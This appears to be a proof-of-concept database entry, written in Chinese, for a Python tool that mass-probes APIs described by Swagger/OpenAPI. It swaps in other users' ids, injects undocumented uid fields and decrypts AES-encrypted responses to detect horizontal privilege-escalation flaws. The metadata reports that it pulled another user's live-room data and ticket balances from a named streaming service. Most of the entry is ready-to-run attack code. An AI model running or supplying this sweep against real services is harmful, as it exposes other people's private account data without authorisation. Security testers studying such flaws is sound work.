# Swagger 驱动的水平越权批量探测（自己/他人 id 对照 + 未文档化参数注入 + 加密响应长度 oracle）

- **code**: swagger-驱动的水平越权批量探测-自己-他人-id-对照-未文档化参数注入-加密响应长度-oracle
- **kind**: poc
- **category**: auth-bypass
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example-com 靶标的龙门直播 API（example.com / 无 WAF 镜像 images.lmim1.com）上实测：解析 279 接口 / 450 definitions，命中 126 个带 id 类字段的接口，63 个只读接口逐个与他人 id 对照，命中 /api/live/getLivePageData 传他人 anchorid 返回他人完整直播间对象（含签名 pull_url）与 /api/live/ticket_list 返回他人观赛券余额；并用「未文档化参数注入」确认 /api/user/getUserInfo、/api/user/getBanks、/api/user/getAddress、/api/auth/getAuthInfo 均为 token 绑定（注入 uid/user_id/query 全无效）。
- **path**: pocs/swagger-驱动的水平越权批量探测-自己-他人-id-对照-未文档化参数注入-加密响应长度-oracle/swagger_idor_sweep.py
- **tags**: idor,swagger,openapi,越权,加密响应,oracle
- **created_at**: 2026-10-08T15:39:39.505Z
- **found_by**: exploit

## 描述

通用「swagger 驱动的水平越权（IDOR）批量探测」框架。前提：目标暴露 /swagger/doc.json（OpenAPI 2.0）。思路：① 解析 paths + definitions，为每个 POST 接口按 schema 生成类型正确的默认 body；② 识别 id 类字段（uid/user_id/anchor_id/liveid/group_id/order_id…）；③ 对每个带 id 的接口，用「自己 id」做基线、换「他人 id」做对照，比较 status/数据长度/是否含目标 id；④ 同时做未文档化字段注入（schema 里没有 uid/user_id，但照样塞进 body 和 query string）；⑤ 关键陷阱：**很多接口响应是 IS_ENCRYPT 加密包，必须以密文块数/解密后长度作为数据量 oracle**，否则会把「有数据」误判成空（例如按 len(data)>40 过滤会漏掉 36 字符的单块密文）。附同源踩坑：错误体 `err_msg` 常回显后端内网地址与文件行号（PACK/FILE/FUNC/LINE），是白盒级信息。

## 用法

```
python swagger_idor_sweep.py https://target.com https://target.com/swagger/doc.json <token> <own_uid> <other_uid>
# 关键参数：HOST / DOC / TOKEN / ME / OTHER / SLEEP(>=0.3s 限速)
# 输出：每条接口 other_len / me_len / status 摘要，标记 OTHER-ONLY DATA / other>me
# 若响应是加密的，请在 DECRYPT() 里填目标自己的加解密（CryptoJS AES-CBC 兼容）
```

## 正文

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Swagger-driven horizontal IDOR sweep. Generic: point it at any OpenAPI 2.0 doc + two identities."""
import base64, io, json, re, sys, time, urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

HOST    = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
DOC     = sys.argv[2] if len(sys.argv) > 2 else HOST + '/swagger/doc.json'
TOKEN   = sys.argv[3] if len(sys.argv) > 3 else 'YOUR_TOKEN'
ME      = sys.argv[4] if len(sys.argv) > 4 else '1000'
OTHER   = sys.argv[5] if len(sys.argv) > 5 else '2000'
SLEEP   = 0.35

IDKEYS = ['uid','user_id','userid','anchor_id','anchorid','anchor','id','live_id','liveid',
          'to_uid','target_uid','from_uid','room_id','roomid','group_id','groupid','match_id',
          'order_id','orderid','ticket_id','bank_id','account_id','member_id','agent_id']
WRITE  = ['edit','update','set','save','create','change','modify','reset','delete','del',
          'cancel','remove','kick','ban','send','apply','commit','grab','charge','pay','like',
          'share','clean','close','settle','quit','clear','upload','bind','unbind','attent',
          'favorite','revoke','provide','use','record','read','logout','deactive']
# 若目标响应是 IS_ENCRYPT（CryptoJS AES-256-CBC/Pkcs7，密文 base64+urlencode+8位hex时间戳），
# 填上 key 前缀与 IV 即可。KEY_PREFIX 常见形态：'ADKOPSTF' + 某常量串。
KEY_PREFIX = None
IV         = None

def decrypt(blob):
    """Return plaintext object for an encrypted envelope, else None."""
    if KEY_PREFIX is None or not isinstance(blob, str) or len(blob) < 20:
        return None
    tail = blob[-8:]
    if not re.fullmatch(r'[0-9A-F]{8}', tail):
        return None
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        raw = base64.b64decode(urllib.parse.unquote(blob[:-8]))
        pt = unpad(AES.new((KEY_PREFIX + tail).encode(), AES.MODE_CBC, IV.encode()).decrypt(raw), 16)
        t = pt.decode('utf-8', 'replace').strip()
        try:
            return json.loads(t)
        except Exception:
            return t
    except Exception:
        return None

def call(path, body, token=TOKEN, uid=ME, timeout=20):
    try:
        r = requests.post(HOST + path, data=json.dumps(body),
                          headers={'Authorization': 'token=%s; uid=%s' % (token, uid),
                                   'Content-Type': 'application/json;charset=UTF-8'},
                          timeout=timeout, verify=False)
        j = {}
        try:
            j = r.json()
        except Exception:
            pass
        plain = decrypt(j.get('data')) if isinstance(j.get('data'), str) else j.get('data')
        return {'status': j.get('status'), 'msg': j.get('msg'), 'plain': plain,
                'text': r.text, 'http': r.status_code}
    except Exception as e:
        return {'exc': '%s %s' % (type(e).__name__, str(e)[:60])}

def dlen(r):
    if not r or 'exc' in r:
        return -1
    p = r.get('plain')
    return len(json.dumps(p, ensure_ascii=False)) if p is not None else 0

def defaults(props):
    b = {}
    for k, v in (props or {}).items():
        if not isinstance(v, dict) or '$ref' in v:
            continue
        b[k] = 1 if v.get('type') == 'integer' else ('' if v.get('type') == 'string' else None)
    for p in ('page', 'pageIndex'):
        if p in b: b[p] = 1
    for p in ('size', 'limit', 'pageSize'):
        if p in b: b[p] = 20
    return {k: v for k, v in b.items() if v is not None}

# ---- 1. parse swagger ----
doc = requests.get(DOC, verify=False, timeout=20).json()
paths, defs = doc.get('paths', {}), doc.get('definitions', {})
print('swagger: %d paths / %d definitions' % (len(paths), len(defs)))

plan = {}
for p, item in paths.items():
    for m, spec in item.items():
        if m != 'post':
            continue
        ref = None
        for prm in spec.get('parameters') or []:
            if prm.get('in') == 'body' and prm.get('schema'):
                ref = prm['schema'].get('$ref')
        d = defs.get(ref.split('/')[-1], {}) if ref else {}
        plan[p] = {'props': list((d.get('properties') or {}).keys()),
                   'base': defaults(d.get('properties'))}

# ---- 2. read-only id sweep with baseline contrast ----
print('\n=== read-only IDOR sweep (ME=%s vs OTHER=%s) ===' % (ME, OTHER))
for p, v in sorted(plan.items()):
    if any(w in p.lower() for w in WRITE):
        continue
    hits = [k for k in v['props'] if k.lower() in IDKEYS]
    if not hits:
        continue
    bo = dict(v['base']);  [bo.__setitem__(k, int(OTHER) if str(OTHER).isdigit() else OTHER) for k in hits]
    bm = dict(v['base']);  [bm.__setitem__(k, int(ME) if str(ME).isdigit() else ME) for k in hits]
    ro, rm = call(p, bo), call(p, bm)
    time.sleep(SLEEP)
    so, sm = dlen(ro), dlen(rm)
    flag = ''
    if ro.get('status') == 0 and so > 0 and sm <= 0:
        flag = ' <<< OTHER-ONLY DATA'
    elif ro.get('status') == 0 and so > sm + 30:
        flag = ' <<< other>me'
    print('[%-44s] o(%-5d) m(%-5d) st=%-4s %s%s' % (p, so, sm, ro.get('status'),
          json.dumps(ro.get('plain'), ensure_ascii=False)[:160], flag))

# ---- 3. undocumented-parameter injection on no-id endpoints ----
print('\n=== undocumented uid/user_id injection on every endpoint ===')
for p, v in sorted(plan.items()):
    if any(w in p.lower() for w in WRITE) or any(k.lower() in IDKEYS for k in v['props']):
        continue
    bo = dict(v['base']); bo['uid'] = int(OTHER) if str(OTHER).isdigit() else OTHER
    bo['user_id'] = bo['uid']
    r = call(p, bo, timeout=15)
    time.sleep(SLEEP)
    if r.get('status') == 0 and dlen(r) > 40:
        print('[%-44s] %s' % (p, json.dumps(r.get('plain'), ensure_ascii=False)[:200]))

```
